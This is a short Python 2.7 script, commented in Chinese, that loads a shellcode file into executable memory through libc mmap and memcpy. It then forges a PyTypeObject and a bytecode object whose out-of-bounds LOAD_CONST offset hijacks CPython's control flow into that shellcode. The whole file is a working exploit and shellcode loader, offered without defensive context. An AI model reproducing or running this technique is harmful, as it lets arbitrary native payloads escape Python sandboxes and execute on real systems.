#coding=utf-8

# 将控制程序流到shellcode
# 通用于x64和aarch64, python2.7.18--(只测试了这么多)

from opcode import opmap
import types,struct
from ctypes import *
import mmap

shellcode_file_path = "test"

def shellcode_to_buffer(shellcode_file):
    shellcode = open(shellcode_file, "rb").read()
    libc = CDLL('libc.so.6')
    libc.mmap.restype = c_void_p
    buf = libc.mmap(0x400000, len(shellcode), 7, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, 0,0)
    libc.memcpy.argtypes = [c_void_p, c_void_p, c_size_t]
    libc.memcpy.restype = c_void_p
    temp = c_char_p(shellcode)
    res= libc.memcpy(buf, temp, c_size_t(len(shellcode)))
    # print("copy: " + hex(res))
    return buf


addr = shellcode_to_buffer(shellcode_file_path)


def code_object():
    pass



# print("[*] info code_object: "+hex(id(code_object)))
def get_code(co_code,co_consts):
    code_object.func_code=types.CodeType(
        0,0,0,0,
        co_code,
        co_consts,(),(),"","",0,""
    )
    return code_object


def get_opcode(opname):
    return chr(opmap[opname])


def p16(content):
    return struct.pack("<H", content)


def p32(content):
    return struct.pack("<I", content)


def p64(content):
    return struct.pack("<Q", content)


# jump to deadbeef ==> fake PyTypeObject
fake_type=0x5c*"a"+p64(addr) 

fake_obj="a"*4+p64(id(fake_type))*2+p64(1)+p64(id(fake_type)) #padding+prev+next+ref+type

fake_obj_ptr=id(fake_obj)+0x38
print("[*] info fake_obj_beg: "+hex(fake_obj_ptr))

to_load="aaaa"+p64(fake_obj_ptr)
to_load_ptr=id(to_load)+0x38
print("[+] to_load_ptr: "+hex(to_load_ptr))

const=("aaaaaa",)

const_ptr=id(const)+0x28
print("[*] info const_ptr: "+hex(const_ptr))

offset=((to_load_ptr-const_ptr)/8) & 0xffffffff
print("[+] Success offset: "+hex(offset))

extended_arg = get_opcode('EXTENDED_ARG')
load_const = get_opcode('LOAD_CONST')
call_function = get_opcode('CALL_FUNCTION')
load_fast = get_opcode('LOAD_FAST')
return_value = get_opcode('RETURN_VALUE')
code=get_code(
    extended_arg+
    p16(offset >> 16)+
    load_const+
    p16(offset&0xffff)+
    call_function+
    p16(0),
    const
)


code()